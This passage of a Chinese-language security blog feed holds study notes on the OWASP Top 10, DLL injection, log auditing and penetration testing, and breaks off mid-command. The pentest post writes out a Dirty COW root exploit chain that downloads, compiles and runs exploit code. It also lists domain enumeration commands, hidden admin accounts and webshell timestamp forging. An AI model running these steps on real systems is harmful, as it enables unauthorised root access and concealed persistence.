    <content type="html"><![CDATA[<h2 id="OWASP-TOP-10"><a href="#OWASP-TOP-10" class="headerlink" title="OWASP TOP 10"></a>OWASP TOP 10</h2><table><thead><tr><th></th><th>漏洞定义</th><th>攻击原理</th><th>利用场景</th><th>修复方案</th><th></th><th></th></tr></thead><tbody><tr><td>XSS</td><td><strong>在动态生成的web页面直接显示不可信（未严格验证）的外部输入</strong>，恶意用户可以利用该缺陷往动态页面中<strong>注入恶意script代码再浏览器页面执行</strong></td><td>存储：留言、评论、博客日志和各类表单等。应用程序从数据库中查询数据，在页面中显示出来  反射：插入url DOM：浏览器</td><td>cookie   网站挂马   钓鱼  xsrf</td><td>http-only</td><td>输入过滤   输出编码处理</td><td>全局XSS过滤器</td></tr><tr><td>SQL注入</td><td>SQL代码<strong>注入或者添加到应用（用户）的输入参数中的攻击</strong>，之后再将这些参数传递<strong>给后台的SQL服务器加以解析并执行</strong></td><td>其本质是对于输入的检查不充分，<strong>简言而之就是用户提交的数据代入数据库的查询</strong>。</td><td>数据泄露  绕过认证、验证、绕过登录</td><td>严格限定参数类型；</td><td>参数化查询强制开发者先定义所有的SQL语句，然后向每个查询传递参数。使用参数化查询可以使数据库区分代码和数据的区别，用户输入会被当做数据处理，而不是当成代码被执行。</td><td>内置过滤系统（本质是黑名单，很常见但不推荐）经常采用addslashes函数，他会在指定的预定义字符前添加反斜杠转义，预定义字符；单引号（‘）双引号（“）反斜杠0 NULL；</td></tr><tr><td>CSRF攻击</td><td><strong>以受害者的名义伪造请求发送给受攻击的站点</strong>，从而在并未授权的情况下执行在权限保护之下的操作</td><td>用户未退出网站A之前，<strong>在同一浏览器中</strong>，打开一个TAB页访问网站B；网站B接收到用户请求后，返回一些攻击性代码，并发出一个请求要求访问第三方站点A；</td><td>添加管理员账号提权   购买商品，虚拟货币转账等</td><td>验证HTTP Referer字段</td><td>在请求头中添加token并验证;在服务器端建立一个拦截器来验证这个token。</td><td>在HTTP头中自定义属性并验证；和第2中方式一样使用token验证，区别在于并不是以请求参数的形式添加到HTTP请求中，而是放置在http头中自定义的属性里</td></tr><tr><td>权限绕过/未授权访问</td><td>超出了权限或权利范围访问系统</td><td>未授权、水平、垂直</td><td>比如说某一页面服务器端响应（不局限于页面返回的信息，有时信息在响应包中，页面不一定能看见）中返回登录名、密码、手机号、身份证等敏感信息，如果存在平行越权，通过对用户ID遍历，就可以查看所有用户的敏感信息，这也是一种变相的脱裤，而且很难被防火墙发现，因为这和正常的访问请求没有什么区别，也不会包含特殊的字符，具有十足的隐蔽性</td><td>对于可控参数进行严格的校验与过滤。</td><td>不要直接使用对象的实名或关键字</td><td>完善用户权限体系</td></tr><tr><td>任意文件上传</td><td>若服务端脚本语言未对上传的文件进行严格的验证和过滤，导致恶意用户上传恶意的脚本文件时，就有可能获取执行服务器命令的能力</td><td>本地文件上传限制被绕过   中间件解析漏洞</td><td>相册、头像上传</td><td>文件扩展名服务器端白名单校验   判断文件类型（可结合MIME Type,后缀检查等方式）</td><td>上传文件重命名   隐藏上传文件路径</td><td>文件上传目录设置为不可执行</td></tr><tr><td>XXE</td><td>XML外部实体注入。当允许引用外部实体时，通过构造恶意的内容，就可以导致任意文件读取，系统命令执行，内网端口探测，攻击内网网站等危害</td><td>通常攻击者会将payload注入到XML文件中，一旦文件被执行，将会被读取服务器上的本地文件，并对内网发起访问扫描内部网络端口。换而言之，XXE是一种从本地到达各种服务器的方法。此外，在一定程度上这也可能帮助攻击者绕过防火墙规则或者身份认证检查。</td><td>远程代码执行，读取服务器文件</td><td>配置XML处理器去使用本地静态的DTD，不允许XML中含有任何自己生命的DTD</td><td></td><td></td></tr><tr><td>会话固定攻击</td><td>会话固定（Session fixation)是一种诱骗受害者使用攻击者指定的会话标识（Session fixation)的攻击手段</td><td>攻击者通过某种手段重置目标用户的SessionID,然后监听用户会话状态</td><td></td><td>每当用户登录的时候就会重置SessionID</td><td>SessionID闲置过久时，进行重置SessionID</td><td><strong>大部分防止会话劫持的方法对会话固定攻击同样有效</strong>。如设置httpOnly，关闭透明化SessionID，User-Agent验证，Token校验等</td></tr><tr><td>敏感信息泄露</td><td>敏感信息通过明文保存，界面未掩码，后端接口返回，直接放在URL中等方式造成数据泄露，称之为敏感信息泄露</td><td></td><td>数据被盗取贩卖</td><td>使用HTTPS传输敏感信息；</td><td>敏感信息使用POST请求提交</td><td></td></tr><tr><td>命令行注入攻击</td><td>参数接收用户输入，并未过滤用户输入的数据，攻击者可以构造恶意命令或代码形成系统命令执行漏洞</td><td></td><td>系统提权;读取/操作系统敏感文件</td><td>用白名单方式，对一切用户输入进行校验过滤</td><td></td><td></td></tr><tr><td>反序列化</td><td></td><td></td><td>通常在解析认证token，session的时候。现在很多web都使用redis、mongodb、memcached等来存储session等状态信息   可能将对象Pickle后在网络中传输</td><td></td><td></td><td></td></tr></tbody></table><h2 id="DLL注入"><a href="#DLL注入" class="headerlink" title="DLL注入"></a>DLL注入</h2><blockquote><p>现代软件其实都不是一个打包的一整个exe，而是一个个互相分工的模块。这样做的好处(多得要死，分工写代码/方便维护/blablabla….</p><p>exe就是软件的<strong>启动模块</strong>。在你打开exe之后，Windows会根据exe的要求，把exe需要的其他模块(也就是dll)，也一起加载进来。以这个exe为启动点关联起来的(exe和dll们)这么一堆代码，就被称为一个进程</p><hr><p><strong>dll注入技术听名字就知道，就是和打针一样，把exe不需要的dll强行加载进进程里去</strong></p><p>现在的反外挂系统，都会监视Windows的这些个接口，发现这些接口被谁调用了！就知道外挂进来了。所以现在的游戏dll注入，一般都用更难被检测出来的输入法注入 而不是Windows提供的接口(道高一尺魔高一丈((逃</p><p>Windows的一个特性，你在一个进程切换输入法，Windows就会把输入法的dll(输入法dll有个别名，叫ime，但其实和dll大同小异)注入到当前进程里去。因为这个是输入法dll，还是操作系统官方名正言顺的注入，所以反外挂系统也很难判断</p></blockquote><h2 id="参考与摘抄"><a href="#参考与摘抄" class="headerlink" title="参考与摘抄"></a>参考与摘抄</h2><ul><li><a href="https://blog.csdn.net/jsqfengbao/article/details/106579446">Owasp Top10 Web安全宝典-常见漏洞及修复方案_D.K专栏-CSDN博客</a></li><li><a href="https://www.zhihu.com/question/63847141/answer/550137041">游戏中注入 DLL 是什么意思，具体怎么实现的？ - LoyieKing的回答 - 知乎</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;OWASP-TOP-10&quot;&gt;&lt;a href=&quot;#OWASP-TOP-10&quot; class=&quot;headerlink&quot; title=&quot;OWASP TOP 10&quot;&gt;&lt;/a&gt;OWASP TOP 10&lt;/h2&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;&lt;/th&gt;
&lt;th&gt;漏洞定义&lt;/th&gt;
&lt;th&gt;攻击原理&lt;/th&gt;
&lt;th&gt;利用场景&lt;/th&gt;
&lt;th&gt;修复方案&lt;/th&gt;
&lt;th&gt;&lt;/th&gt;
&lt;th&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;XSS&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;在动态生成的web页面直接显示不可信（未严格验证）的外部输入&lt;/strong&gt;，恶意用户可以利用该缺陷往动态页面中&lt;strong&gt;注入恶意script代码再浏览器页面执行&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;存储：留言、评论、博客日志和各类表单等。应用程序从数据库中查询数据，在页面中显示出来  反射：插入url DOM：浏览器&lt;/td&gt;
&lt;td&gt;cookie   网站挂马   钓鱼  xsrf&lt;/td&gt;
&lt;td&gt;http-only&lt;/td&gt;
&lt;td&gt;输入过滤   输出编码处理&lt;/td&gt;
&lt;td&gt;全局XSS过滤器&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;SQL注入&lt;/td&gt;
&lt;td&gt;SQL代码&lt;strong&gt;注入或者添加到应用（用户）的输入参数中的攻击&lt;/strong&gt;，之后再将这些参数传递&lt;strong&gt;给后台的SQL服务器加以解析并执行&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;其本质是对于输入的检查不充分，&lt;strong&gt;简言而之就是用户提交的数据代入数据库的查询&lt;/strong&gt;。&lt;/td&gt;
&lt;td&gt;数据泄露  绕过认证、验证、绕过登录&lt;/td&gt;
&lt;td&gt;严格限定参数类型；&lt;/td&gt;
&lt;td&gt;参数化查询强制开发者先定义所有的SQL语句，然后向每个查询传递参数。使用参数化查询可以使数据库区分代码和数据的区别，用户输入会被当做数据处理，而不是当成代码被执行。&lt;/td&gt;
&lt;td&gt;内置过滤系统（本质是黑名单，很常见但不推荐）经常采用addslashes函数，他会在指定的预定义字符前添加反斜杠转义，预定义字符；单引号（‘）双引号（“）反斜杠0 NULL；&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;CSRF攻击&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;以受害者的名义伪造请求发送给受攻击的站点&lt;/strong&gt;，从而在并未授权的情况下执行在权限保护之下的操作&lt;/td&gt;
&lt;td&gt;用户未退出网站A之前，&lt;strong&gt;在同一浏览器中&lt;/strong&gt;，打开一个TAB页访问网站B；网站B接收到用户请求后，返回一些攻击性代码，并发出一个请求要求访问第三方站点A；&lt;/td&gt;
&lt;td&gt;添加管理员账号提权   购买商品，虚拟货币转账等&lt;/td&gt;
&lt;td&gt;验证HTTP Referer字段&lt;/td&gt;
&lt;td&gt;在请求头中添加token并验证;在服务器端建立一个拦截器来验证这个token。&lt;/td&gt;
&lt;td&gt;在HTTP头中自定义属性并验证；和第2中方式一样使用token验证，区别在于并不是以请求参数的形式添加到HTTP请求中，而是放置在http头中自定义的属性里&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;权限绕过/未授权访问&lt;/td&gt;
&lt;td&gt;超出了权限或权利范围访问系统&lt;/td&gt;
&lt;td&gt;未授权、水平、垂直&lt;/td&gt;
&lt;td&gt;比如说某一页面服务器端响应（不局限于页面返回的信息，有时信息在响应包中，页面不一定能看见）中返回登录名、密码、手机号、身份证等敏感信息，如果存在平行越权，通过对用户ID遍历，就可以查看所有用户的敏感信息，这也是一种变相的脱裤，而且很难被防火墙发现，因为这和正常的访问请求没有什么区别，也不会包含特殊的字符，具有十足的隐蔽性&lt;/td&gt;
&lt;td&gt;对于可控参数进行严格的校验与过滤。&lt;/td&gt;
&lt;td&gt;不要直接使用对象的实名或关键字&lt;/td&gt;
&lt;td&gt;完善用户权限体系&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;任意文件上传&lt;/td&gt;
&lt;td&gt;若服务端脚本语言未对上传的文件进行严格的验证和过滤，导致恶意用户上传恶意的脚本文件时，就有可能获取执行服务器命令的能力&lt;/td&gt;
&lt;td&gt;本地文件上传限制被绕过   中间件解析漏洞&lt;/td&gt;
&lt;td&gt;相册、头像上传&lt;/td&gt;
&lt;td&gt;文件扩展名服务器端白名单校验   判断文件类型（可结合MIME Type,后缀检查等方式）&lt;/td&gt;
&lt;td&gt;上传文件重命名   隐藏上传文件路径&lt;/td&gt;
&lt;td&gt;文件上传目录设置为不可执行&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;XXE&lt;/td&gt;
&lt;td&gt;XML外部实体注入。当允许引用外部实体时，通过构造恶意的内容，就可以导致任意文件读取，系统命令执行，内网端口探测，攻击内网网站等危害&lt;/td&gt;
&lt;td&gt;通常攻击者会将payload注入到XML文件中，一旦文件被执行，将会被读取服务器上的本地文件，并对内网发起访问扫描内部网络端口。换而言之，XXE是一种从本地到达各种服务器的方法。此外，在一定程度上这也可能帮助攻击者绕过防火墙规则或者身份认证检查。&lt;/td&gt;
&lt;td&gt;远程代码执行，读取服务器文件&lt;/td&gt;
&lt;td&gt;配置XML处理器去使用本地静态的DTD，不允许XML中含有任何自己生命的DTD&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;会话固定攻击&lt;/td&gt;
&lt;td&gt;会话固定（Session fixation)是一种诱骗受害者使用攻击者指定的会话标识（Session fixation)的攻击手段&lt;/td&gt;
&lt;td&gt;攻击者通过某种手段重置目标用户的SessionID,然后监听用户会话状态&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;每当用户登录的时候就会重置SessionID&lt;/td&gt;
&lt;td&gt;SessionID闲置过久时，进行重置SessionID&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;大部分防止会话劫持的方法对会话固定攻击同样有效&lt;/strong&gt;。如设置httpOnly，关闭透明化SessionID，User-Agent验证，Token校验等&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;敏感信息泄露&lt;/td&gt;
&lt;td&gt;敏感信息通过明文保存，界面未掩码，后端接口返回，直接放在URL中等方式造成数据泄露，称之为敏感信息泄露&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;数据被盗取贩卖&lt;/td&gt;
&lt;td&gt;使用HTTPS传输敏感信息；&lt;/td&gt;
&lt;td&gt;敏感信息使用POST请求提交&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;命令行注入攻击&lt;/td&gt;
&lt;td&gt;参数接收用户输入，并未过滤用户输入的数据，攻击者可以构造恶意命令或代码形成系统命令执行漏洞&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;系统提权;读取/操作系统敏感文件&lt;/td&gt;
&lt;td&gt;用白名单方式，对一切用户输入进行校验过滤&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;反序列化&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;通常在解析认证token，session的时候。现在很多web都使用redis、mongodb、memcached等来存储session等状态信息   可能将对象Pickle后在网络中传输&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;h2 id=&quot;DLL注入&quot;&gt;&lt;a href=&quot;#DLL注入&quot; class=&quot;headerlink&quot; title=&quot;DLL注入&quot;&gt;&lt;/a&gt;DLL注入&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;现代软件其实都不是一个打包的一整个exe，而是一个个互相分工的模块。这样做的好处(多得要死，分工写代码/方便维护/blablabla….&lt;/p&gt;
&lt;p&gt;exe就是软件的&lt;strong&gt;启动模块&lt;/strong&gt;。在你打开exe之后，Windows会根据exe的要求，把exe需要的其他模块(也就是dll)，也一起加载进来。以这个exe为启动点关联起来的(exe和dll们)这么一堆代码，就被称为一个进程&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;dll注入技术听名字就知道，就是和打针一样，把exe不需要的dll强行加载进进程里去&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;现在的反外挂系统，都会监视Windows的这些个接口，发现这些接口被谁调用了！就知道外挂进来了。所以现在的游戏dll注入，一般都用更难被检测出来的输入法注入 而不是Windows提供的接口(道高一尺魔高一丈((逃&lt;/p&gt;
&lt;p&gt;Windows的一个特性，你在一个进程切换输入法，Windows就会把输入法的dll(输入法dll有个别名，叫ime，但其实和dll大同小异)注入到当前进程里去。因为这个是输入法dll，还是操作系统官方名正言顺的注入，所以反外挂系统也很难判断&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;参考与摘抄&quot;&gt;&lt;a href=&quot;#参考与摘抄&quot; class=&quot;headerlink&quot; title=&quot;参考与摘抄&quot;&gt;&lt;/a&gt;参考与摘抄&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://blog.csdn.net/jsqfengbao/article/details/106579446&quot;&gt;Owasp Top10 Web安全宝典-常见漏洞及修复方案_D.K专栏-CSDN博客&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.zhihu.com/question/63847141/answer/550137041&quot;&gt;游戏中注入 DLL 是什么意思，具体怎么实现的？ - LoyieKing的回答 - 知乎&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</summary>
    
    
    
    <category term="Security" scheme="https://hejueyun.github.io/categories/Security/"/>
    
    
  </entry>
  
  <entry>
    <title>日志审计与痕迹清除</title>
    <link href="https://hejueyun.github.io/posts/8ee79e5a/"/>
    <id>https://hejueyun.github.io/posts/8ee79e5a/</id>
    <published>2020-09-28T01:39:16.000Z</published>
    <updated>2021-04-25T07:09:09.506Z</updated>
    
    <content type="html"><![CDATA[<img src="/posts/8ee79e5a/2020-09-28-09-46-51.png" width height="250"><span id="more"></span><h2 id="日志文件"><a href="#日志文件" class="headerlink" title="日志文件"></a>日志文件</h2><h3 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h3><ul><li><code>C:\Windows\System32\winevt\Logs</code>下<ul><li><code>*.evtx</code>文件</li><li>以事件查看器的方式打开</li></ul></li></ul><img src="/posts/8ee79e5a/2020-09-28-09-52-56.png" width height="250"><blockquote><p>Windows主要有以下三类日志记录系统事件：应用程序日志、系统日志和安全日志</p><ul><li>系统日志: 记录操作系统组件产生的事件，主要包括驱动程序、系统组件和应用软件的崩溃以及数据丢失错误等</li><li>应用程序日志: 包含由应用程序或系统程序记录的事件，主要记录程序运行方面的事件，例如数据库程序可以在应用程序日志中记录文件错误，程序开发人员可以自行决定监视哪些事件</li><li>安全日志: 记录系统的安全审计事件，包含各种类型的登录日志、对象访问日志、进程追踪日志、特权使用、帐号管理、策略变更、系统事件</li></ul></blockquote><h3 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h3><blockquote><p>大部分Linux发行版默认的日志守护进程为 syslog，位于 <code>/etc/syslog</code> 或 /etc/syslogd 或/etc/rsyslog.d，默认配置文件为 /etc/syslog.conf 或 rsyslog.conf，任何希望生成日志的程序都可以向 syslog 发送信息</p></blockquote><img src="/posts/8ee79e5a/2020-09-28-10-42-08.png" width height="300"><ul><li>last<ul><li><code>/var/log/wtmp</code></li></ul></li><li>lastlog<ul><li><code>/var/log/lastlog</code></li></ul></li><li>lastb<ul><li><code>/vat/log/btmp</code></li></ul></li><li>who或users命令<ul><li><code>/var/log/wtmp</code></li></ul></li></ul><h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><blockquote><p>Web日志分析实例：通过nginx代理转发到内网某服务器，内网服务器某站点目录下被上传了多个图片木马，虽然II7下不能解析，但还是想找出谁通过什么路径上传的。</p><p>在这里，我们遇到了一个问题：由于设置了代理转发，只记录了代理服务器的ip，并没有记录访问者IP？这时候，如何去识别不同的访问者和攻击源呢？</p><p>这是管理员日志配置不当的问题，但好在我们可以通过<strong>浏览器指纹</strong>来定位不同的访问来源，还原攻击路径。</p></blockquote><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1、列出当天访问次数最多的IP命令：</span><br><span class="line">cut -d- -f 1 log_file|uniq -c | sort -rn | head -20</span><br><span class="line"></span><br><span class="line">2、查看当天有多少个IP访问：</span><br><span class="line">awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> log_file|sort|uniq|wc -l</span><br><span class="line"></span><br><span class="line">3、查看某一个页面被访问的次数：</span><br><span class="line">grep <span class="string">&quot;/index.php&quot;</span> log_file | wc -l</span><br></pre></td></tr></table></figure><h3 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h3><h2 id="日志审计"><a href="#日志审计" class="headerlink" title="日志审计"></a>日志审计</h2><h3 id="windows-1"><a href="#windows-1" class="headerlink" title="windows"></a>windows</h3><blockquote><p>对于Windows事件日志分析，不同的EVENT ID代表了不同的意义</p><ul><li><code>4624     登录成功</code></li></ul><p>在事件查看器中，单击“安全”，查看安全日志；在安全日志右侧操作中，点击“筛选当前日志”，输入事件ID进行筛选。</p></blockquote><h4 id="Log-Parser"><a href="#Log-Parser" class="headerlink" title="Log Parser"></a>Log Parser</h4><blockquote><p>Log Parser（是微软公司出品的日志分析工具，它功能强大，使用简单，可以分析基于文本的日志文件、XML 文件、CSV（逗号分隔符）文件，以及操作系统的事件日志、注册表、文件系统、Active Directory。它可以像使用 SQL 语句一样查询分析这些数据，甚至可以把分析结果以各种图表的形式展现出来。</p></blockquote><h2 id="痕迹清除"><a href="#痕迹清除" class="headerlink" title="痕迹清除"></a>痕迹清除</h2><h2 id="攻击溯源"><a href="#攻击溯源" class="headerlink" title="攻击溯源"></a>攻击溯源</h2><ul><li><p><strong>确定入侵的时间范围，以此为线索，查找这个时间范围内可疑的日志</strong>，进一步排查，最终确定攻击者，还原攻击过程</p></li><li><p>攻击者在入侵网站后，通常会留下后门维持权限，以方便再次访问，<strong>我们可以找到该文件，并以此为线索来展开分析</strong></p></li><li><p>通过筛选与该浏览器指纹有关的日志记录，可以清晰地看到攻击者的攻击路径</p></li><li><p>对找到的访问日志进行解读，攻击者大致的访问路径如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">A、攻击者访问首页和登录页</span><br><span class="line">B、攻击者访问MsgSjlb.aspx和MsgSebd.aspx</span><br><span class="line">C、攻击者访问Xzuser.aspx</span><br><span class="line">D、攻击者多次POST（怀疑通过这个页面上传模块缺陷）</span><br><span class="line">E、攻击者访问了图片木马</span><br></pre></td></tr></table></figure></li></ul><h2 id="参考与摘抄"><a href="#参考与摘抄" class="headerlink" title="参考与摘抄"></a>参考与摘抄</h2><ul><li><a href="https://www.secpulse.com/archives/106858.html">Window日志分析 - SecPulse.COM | 安全脉搏</a></li><li><a href="https://bypass007.github.io/Emergency-Response-Notes/LogAnalysis/%E7%AC%AC3%E7%AF%87%EF%BC%9AWeb%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90.html">第3篇:Web日志分析 · 应急响应实战笔记</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;img src=&quot;/posts/8ee79e5a/2020-09-28-09-46-51.png&quot; width height=&quot;250&quot;&gt;

&lt;span id=&quot;more&quot;&gt;&lt;/span&gt;

&lt;h2 id=&quot;日志文件&quot;&gt;&lt;a href=&quot;#日志文件&quot; class=&quot;headerlink&quot; title=&quot;日志文件&quot;&gt;&lt;/a&gt;日志文件&lt;/h2&gt;&lt;h3 id=&quot;windows&quot;&gt;&lt;a href=&quot;#windows&quot; class=&quot;headerlink&quot; title=&quot;windows&quot;&gt;&lt;/a&gt;windows&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;code&gt;C:\Windows\System32\winevt\Logs&lt;/code&gt;下&lt;ul&gt;
&lt;li&gt;&lt;code&gt;*.evtx&lt;/code&gt;文件&lt;/li&gt;
&lt;li&gt;以事件查看器的方式打开&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;img src=&quot;/posts/8ee79e5a/2020-09-28-09-52-56.png&quot; width height=&quot;250&quot;&gt;

&lt;blockquote&gt;
&lt;p&gt;Windows主要有以下三类日志记录系统事件：应用程序日志、系统日志和安全日志&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;系统日志: 记录操作系统组件产生的事件，主要包括驱动程序、系统组件和应用软件的崩溃以及数据丢失错误等&lt;/li&gt;
&lt;li&gt;应用程序日志: 包含由应用程序或系统程序记录的事件，主要记录程序运行方面的事件，例如数据库程序可以在应用程序日志中记录文件错误，程序开发人员可以自行决定监视哪些事件&lt;/li&gt;
&lt;li&gt;安全日志: 记录系统的安全审计事件，包含各种类型的登录日志、对象访问日志、进程追踪日志、特权使用、帐号管理、策略变更、系统事件&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;linux&quot;&gt;&lt;a href=&quot;#linux&quot; class=&quot;headerlink&quot; title=&quot;linux&quot;&gt;&lt;/a&gt;linux&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;大部分Linux发行版默认的日志守护进程为 syslog，位于 &lt;code&gt;/etc/syslog&lt;/code&gt; 或 /etc/syslogd 或/etc/rsyslog.d，默认配置文件为 /etc/syslog.conf 或 rsyslog.conf，任何希望生成日志的程序都可以向 syslog 发送信息&lt;/p&gt;
&lt;/blockquote&gt;
&lt;img src=&quot;/posts/8ee79e5a/2020-09-28-10-42-08.png&quot; width height=&quot;300&quot;&gt;</summary>
    
    
    
    <category term="Security" scheme="https://hejueyun.github.io/categories/Security/"/>
    
    <category term="Network Security" scheme="https://hejueyun.github.io/categories/Security/Network-Security/"/>
    
    
  </entry>
  
  <entry>
    <title>渗透测试与主机加固</title>
    <link href="https://hejueyun.github.io/posts/cc1ceb62/"/>
    <id>https://hejueyun.github.io/posts/cc1ceb62/</id>
    <published>2020-09-25T06:23:59.000Z</published>
    <updated>2021-05-11T09:33:23.351Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>想象自己是一个特工，你的目标是监控一个重要的人，有一天你怀疑目标家里的窗子可能没有关，于是你上前推了推，结果推开了，这是一个 PoC，于是你回去了，开始准备第二天的渗透计划，第二天你通过同样的漏洞渗透进了它家，仔细查看了所有的重要文件，离开时还安装了一个隐蔽的窃听器，这一天你所做的就是一个 Exp，你在他家所做的就是不同的 Payload，就把窃听器当作 Shellcode 吧！</p><ul><li><a href="https://howiezhao.github.io/2018/04/29/payload-shellcode-exp-poc/">渗透中 PoC、Exp、Payload 与 Shellcode 的区别</a></li></ul></blockquote><h2 id="渗透测试框架"><a href="#渗透测试框架" class="headerlink" title="渗透测试框架"></a>渗透测试框架</h2><h3 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h3><h3 id="Empire"><a href="#Empire" class="headerlink" title="Empire"></a>Empire</h3><h3 id="Cobalt-Strike"><a href="#Cobalt-Strike" class="headerlink" title="Cobalt Strike"></a>Cobalt Strike</h3><span id="more"></span><h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><center><img src="/posts/cc1ceb62/2.jpg" height="350"></center><h3 id="使用已知漏洞提权"><a href="#使用已知漏洞提权" class="headerlink" title="使用已知漏洞提权"></a>使用已知漏洞提权</h3><p>根据可已知内核漏洞下载对应的提权程序(该处使用脏牛内核提权)</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp/</span><br><span class="line">wget ‐‐no‐check‐certificate https://raw.githubusercontent.com/K3vinPlus/sundry/master/DirtyCow/dir ty.c</span><br><span class="line">gcc ‐pthread dirty.c ‐o dirty ‐lcrypt</span><br><span class="line">./dirty 123456</span><br><span class="line"><span class="comment"># 获得firefart用户，权限为root</span></span><br><span class="line">su firefart</span><br><span class="line"><span class="comment"># 切换用户为firefart后，将passwd恢复,避免root用户无法使用</span></span><br><span class="line">mv /tmp/passwd.bak /etc/passwd</span><br></pre></td></tr></table></figure><h3 id="内网横向移动"><a href="#内网横向移动" class="headerlink" title="内网横向移动"></a>内网横向移动</h3><blockquote><p>将网络中多台计算机逻辑上组织到一起进行集中管理，这种区别于工作组的逻辑环境叫做域。域是由域控制器（Domain Controller）和成员计算机组成，域控制器就是安装了活动目录（Active Directory）的计算</p><p>用户一次登录就可访问整个网络资源，集中的身份验证</p></blockquote><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">查询域管理用户：<span class="built_in">net</span> group “domain admins” /domain</span><br><span class="line">查看域密码策略：<span class="built_in">net</span> accounts /domain</span><br></pre></td></tr></table></figure><ul><li>Mimikatz</li></ul><h3 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h3><h4 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h4><p>隐藏</p><ul><li>隐藏文件</li><li>隐藏账号<blockquote><p>window 隐藏系统用户操作，CMD命令行下，建立了一个用户名为“test$”，密码为“abc123!”的简单隐藏账户,并且把该隐藏账户提升为了管理员权限</p><ul><li>CMD命令行使用”net user”,看不到”test$”这个账号，但在控制面板和本地用户和组是可以显示此用户的</li></ul></blockquote></li><li>端口复用<ul><li><a href="https://github.com/crabkun/Switcher">https://github.com/crabkun/Switcher</a></li></ul></li><li>进程注入<ul><li>meterpreter会话注入</li></ul></li></ul><p>后门</p><ul><li>注册表自启动</li><li>组策略设置脚本启动</li><li>计划任务</li><li>dll劫持<blockquote><p>如果在进程尝试加载一个DLL时没有指定DLL的绝对路径，那么Windows会尝试去指定的目录下查找这个DLL；如果攻击者能够控制其中的某一 个目录，并且放一个恶意的DLL文件到这个目录下，这个恶意的DLL便会被进程所加载，从而造成代码执行。</p><ul><li>win7及win7以上系统增加了KnownDLLs保护</li></ul></blockquote></li></ul><h4 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h4><p>隐藏</p><ul><li>隐藏文件<ul><li><code>touch .test.txt</code></li></ul></li><li>隐藏文件时间戳<ul><li><code>touch -r index.php webshell.php</code></li><li><code>touch -t 